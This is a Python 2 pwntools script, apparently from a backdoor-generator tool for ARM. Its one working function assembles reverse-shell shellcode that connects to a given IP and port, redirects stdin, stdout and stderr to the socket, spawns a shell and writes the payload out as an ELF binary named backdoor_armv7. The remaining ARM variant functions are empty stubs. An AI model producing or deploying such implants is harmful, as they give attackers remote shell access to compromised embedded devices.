from pwn import *
import extract_shellcode

def generate_armelv7_backdoor(reverse_ip,reverse_port,filename):
	basic_shellcode=asm(shellcraft.connect(reverse_ip,reverse_port))
	shellcode2='''
	mov r5,r6
	mov r0,r5
	mov r1,#0
	movw r7,#0x3f
	svc #0
	mov r0,r5
	mov r1,#1
	svc #0
	mov r0,r5
	mov r1,#2
	svc #0
	'''
	shellcode2=asm(shellcode2)
	shellcode3=asm(shellcraft.sh())
	all_reverseshell=basic_shellcode+shellcode2+shellcode3
	data=make_elf(all_reverseshell)
	if filename==None:
		filename="backdoor_armv7"
		f=open(filename,"wb")
		f.write(data)
		f.close()
		#print disasm(all_reverseshell)
		print "backdoor_armv7 is ok in ./"
	else:
		f=open(filename,"wb")
		f.write(data)
		f.close()
		#print disasm(all_reverseshell)
		print "{} is ok in ./"

def generate_armelv7_shellcode(reverse_ip,reverse_port):
	pass


def generate_armelv5_backdoor(reverse_ip,reverse_port):
	pass


def generate_armelv5_shellcode(reverse_ip,reverse_port):
	pass


def generate_armebv7_shellcode(reverse_ip,reverse_port):
	pass

def generate_armebv5_shellcode(reverse_ip,reverse_port):
	pass

def generate_armebv7_backdoor(reverse_ip,reverse_port,filename):
	pass

def generate_armebv5_backdoor(reverse_ip,reverse_port,filename):
	pass